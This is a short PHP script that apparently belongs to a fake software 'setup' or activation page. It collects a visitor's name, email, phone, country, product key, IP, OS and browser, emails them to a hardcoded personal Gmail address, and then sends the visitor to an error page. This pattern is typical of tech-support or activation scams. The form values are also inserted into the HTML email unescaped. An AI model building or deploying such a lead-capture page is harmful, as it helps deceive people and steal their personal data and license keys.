<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['nameField'];
    $email = $_POST['emailField'];
    $mobile = $_POST['mobField'];
    $country = $_POST['countField'];
    $key = $_POST['keyField'];
    $ip = $_POST['ipField'];
    $os = $_POST['osField'];
    $browser = $_POST['browserField'];

    $to = "visit.rahul0036@gmail.com"; // <- apna Gmail yahan likho
    $subject = "New Setup Lead Submitted";
    $message = "
    <h3>Setup Form Lead Details:</h3>
    <p><strong>Name:</strong> $name</p>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Mobile:</strong> $mobile</p>
    <p><strong>Country:</strong> $country</p>
    <p><strong>Product Key:</strong> $key</p>
    <p><strong>IP Address:</strong> $ip</p>
    <p><strong>Operating System:</strong> $os</p>
    <p><strong>Browser:</strong> $browser</p>
    ";

    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: noreply@yourdomain.com" . "\r\n"; // optional

    if (mail($to, $subject, $message, $headers)) {
        header("Location: actnor-err.html"); // optional: page after submit
        exit();
    } else {
        echo "Error sending email!";
    }
} else {
    echo "Invalid request.";
}
?>
